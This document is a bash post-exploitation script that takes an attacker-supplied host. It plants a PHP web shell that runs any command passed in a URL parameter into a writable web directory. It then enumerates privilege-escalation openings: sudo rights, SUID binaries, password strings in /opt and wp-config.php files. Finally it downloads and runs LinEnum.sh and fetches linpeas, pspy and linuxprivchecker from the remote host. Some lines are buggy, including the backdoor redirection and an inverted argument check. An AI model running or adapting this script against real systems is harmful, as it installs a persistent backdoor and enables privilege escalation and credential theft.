#!/usr/bin/bash

if [ -z "$1" ]
  then
	echo "Host Required"
	exit
fi

# Install PHP backdoor in web root
backdoor()
{
echo "#### Backdoor Install Attempt ####\n"
echo "<?php passthru($_GET['cmd']); ?>" > /var/www/`find /var/www -perm -o+w` 1>/shell.php
}

# Run quick enum commands
commands()
{
echo "\n#### Sudoers ####\n"
sudo -l

echo "\n#### Kernel ####\n"
uname -a

echo "\n#### SUID Files ####\n"
find / -type f -perm -4000 2>/dev/null

echo "\n#### Passwords in /opt?? ####\n"
grep -iRl password /opt/*

echo "\n#### Check /opt ####\n"
ls -la /opt

echo "\n#### Any wp-config.php files? ####\n"
find / -name wp-config.php 2>/dev/null

if [ -z "$2" ]
  then
	echo "\n#### Files Owned by User: $2 ####\n"
	find / -user $2 2>/dev/null
fi



echo "\n#### Processes ####\n"
ps aux
}

# Download enumeration scripts and binaries
downloads() {
echo "\n#### Download and Run LinEnum.sh ####\n"
wget $1/LinEnum.sh
bash LinEnum.sh -r report.txt

echo "\n#### Downloading psspy ####\n"
wget $1/psspy

echo "\n#### Downloading linux-priv-checker ####\n"
wget $1/linuxprivchecker.py

echo "\n#### Downloading linpeas.sh ####\n"
wget $1/linpeas.sh
}

